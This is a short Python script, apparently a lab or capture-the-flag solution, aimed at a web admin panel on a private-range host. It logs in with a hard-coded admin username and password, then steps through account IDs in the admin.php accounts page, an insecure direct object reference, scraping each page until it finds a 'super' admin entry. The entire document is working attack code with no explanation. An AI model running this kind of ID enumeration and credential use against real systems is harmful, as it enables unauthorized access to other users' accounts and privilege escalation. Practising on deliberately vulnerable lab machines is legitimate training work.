import sys
import requests
from bs4 import BeautifulSoup

with requests.Session() as r:

	login_url = "http://10.10.10.28/cdn-cgi/login/index.php"


	login_credentials ={
		"username":"admin",
		"password":"MEGACORP_4dm1n!!"

		}
	r.post(login_url,data=login_credentials)


	# Super Admin Find?

	for x in range(0,31):
		try:
			super_admin_url = "http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id="+str(x)
			rep = r.get(super_admin_url)

			soup = BeautifulSoup(rep.text, "html.parser")

			# print("INDEX : ",x, "\n" ,soup.find("table").find_all("td"))


			for y in soup.find("table").find_all("td"):
				if "super" in y.text:
					print("INDEX : ", x)
					print(soup.find("table").find_all("td"))

					exit(1)


		except Exception as e :
	
			continue